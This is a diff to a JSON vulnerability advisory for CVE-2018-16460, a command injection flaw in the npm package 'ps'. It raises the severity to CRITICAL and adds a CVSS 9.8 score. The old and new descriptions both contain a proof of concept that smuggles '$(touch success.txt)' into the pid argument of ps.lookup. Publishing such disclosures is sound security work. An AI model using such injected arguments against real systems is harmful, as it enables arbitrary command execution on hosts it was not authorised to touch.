@@ -1,6 +1,6 @@
 {
-  "Severity": "MODERATE",
-  "UpdatedAt": "2018-09-17T20:43:52Z",
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2023-09-11T18:21:35Z",
   "Package": {
     "Ecosystem": "NPM",
     "Name": "ps"
@@ -36,16 +36,16 @@
         "Value": "CVE-2018-16460"
       }
     ],
-    "Description": "Versions of `ps` before 1.0.0 are vulnerable to command injection.\n\nProof of concept:\n\n```\nvar ps = require('ps');\n\nps.lookup({ pid: \"$(touch success.txt)\" }, function(err, proc) { // this method is vulnerable to command injection\n    if (err) {throw err;}\n    if (proc) {\n        console.log(proc);  // Process name, something like \"node\" or \"bash\"\n    } else {\n        console.log('No such process');\n    }\n});\n\n// Result: The file success.txt will exist on the filesystem if the touch command was executed\n```\n\n\n## Recommendation\n\nUpdate to version 1.0.0 or later.",
+    "Description": "Versions of `ps` before 1.0.0 are vulnerable to command injection.\n\n### Proof of concept:\n```js\nvar ps = require('ps');\n\nps.lookup({ pid: \"$(touch success.txt)\" }, function(err, proc) { // this method is vulnerable to command injection\n    if (err) {throw err;}\n    if (proc) {\n        console.log(proc);  // Process name, something like \"node\" or \"bash\"\n    } else {\n        console.log('No such process');\n    }\n});\n\n// Result: The file success.txt will exist on the filesystem if the touch command was executed\n```\n\n\n## Recommendation\n\nUpdate to version 1.0.0 or later.",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2018-09-17T20:43:59Z",
-    "Severity": "MODERATE",
-    "Summary": "Command Injection in ps",
-    "UpdatedAt": "2023-01-09T05:03:00Z",
+    "Severity": "CRITICAL",
+    "Summary": "ps Enables OS Command Injection",
+    "UpdatedAt": "2023-09-11T18:21:35Z",
     "WithdrawnAt": "",
     "CVSS": {
-      "Score": 0,
-      "VectorString": ""
+      "Score": 9.8,
+      "VectorString": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
     }
   },
   "Versions": [
